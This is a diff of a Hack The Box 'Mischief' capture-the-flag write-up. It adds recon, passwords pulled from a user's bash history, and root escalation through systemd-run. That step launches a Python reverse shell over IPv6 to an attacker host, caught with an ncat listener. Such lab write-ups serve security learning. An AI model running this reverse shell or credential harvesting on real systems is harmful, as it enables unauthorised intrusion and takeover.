@@ -1,19 +1,20 @@
 ---
 title: HTB - Mischief Write-up
 author: bigb0ss
-date: 2020-11-03 23:25:00 +0800
-categories: [Hack The Box, Linux, Insance]
-tags: [hackthebox, mischief]
+date: 2020-11-05 21:36:00 +0800
+categories: [Hack The Box, Linux, Insane]
+tags: [hackthebox, mischief, SNMP, IPv6, ICMP, systemd-run]
 ---
 
 ![image](/assets/img/post/htb/mischief/01_infocard.png)
 
 
 
-This box was pretty simple and easy one to fully compromise. Good learning path to:
-* 
-* 
-* 
+[ SNMP ] [ IPv6 ] [ ICMP ] [ systemd-run ] This was an insane difficulty box and had many tricky steps to fully compromise it. Good learning path to:
+* UDP Service Enumeration
+* SNMP to obtain IPv6 Address
+* ICMP Data Exfiltration
+* `systemd-run` Command
 
 ## Recon
 
@@ -42,7 +43,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Let's also run a port scan against the UDP ports as well:
 
 ```console
+$ nmap -Pn --open -sU -F 10.10.10.92
 
+PORT    STATE SERVICE
+161/udp open  snmp
 ```
 
 ### Interesting Ports
@@ -187,12 +191,92 @@ With this credenitals (`loki : lokiisthebestnorsegod`), we can now `ssh` into th
 ![image](/assets/img/post/htb/mischief/07_ssh.png)
 
 
-
-
 ## Privilege Escalation
 
-### www-data --> hugo (user.txt)
+### loki --> root (systemd-run)
 
+Another password can be found in `loki`'s `.bash_history` file.
 
-### hugo --> root (CVE-2019-14287)
+![image](/assets/img/post/htb/mischief/08_bashHistory.png)
 
+I wanted to try that newly obtained password (`lokipasswordmischieftrickery`) for the `root` user, but `/bin/su` command was restricted for the `loki` user.
+
+```console
+loki@Mischief:~$ su
+-bash: /bin/su: Permission denied
+```
+
+By checking the `/bin/su` permission via `getfacl` command, we can see that the `loki` user cannot execute the command:
+
+```console
+loki@Mischief:~$ getfacl /bin/su
+getfacl: Removing leading '/' from absolute path names
+# file: bin/su
+# owner: root
+# group: root
+# flags: s--
+user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+other::r-x
+```
+
+<b>systemd-run</b>
+
+We can see that the `loki` user can run the `systemd-run` command, which is:
+>**Systemd-run**: If a command is run as transient scope unit, it will be executed by systemd-run itself as parent process and will thus inherit the execution environment of the caller.
+
+And another caveat for the network issue is that the `Mischief` host does not allow IPv4 outbound connection; however, it allows it via IPv6. And the `systemd-run` command will not give us interative shell acess, so we will create a reverse shell over IPv6 with it. 
+
+```console
+loki@Mischief:~$ systemd-run python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1017",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
+Authentication is required to manage system services or other units.                                                                                                             
+Authenticating as: root
+Password: 
+==== AUTHENTICATION COMPLETE ===
+Running as unit: run-u11.service
+```
+
+In our `ncat` lister, we will get the `root` shell.
+
+```console
+root@kali:~/Documents/htb/box/mischief# ncat -6 -lvnp 443
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Connection from dead:beef::250:56ff:feb9:5f3d.
+Ncat: Connection from dead:beef::250:56ff:feb9:5f3d:38456.
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# ifconfig
+ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.92  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 dead:beef::250:56ff:feb9:5f3d  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:feb9:5f3d  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:5f:3d  txqueuelen 1000  (Ethernet)
+        RX packets 763  bytes 63135 (63.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 343  bytes 44280 (44.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+<b>root.txt</b>
+
+The `root.txt` flag wasn't there as usual. But just simply using the `find` command we could find the actual location for the real `root.txt` file.
+
+```console
+# cat /root/root.txt
+The flag is not here, get a shell to find it!
+
+# find / -name root.txt
+/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+/root/root.txt
+
+# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+ae15<REDACTED>7807
+```
+
+Thanks for reading! :]
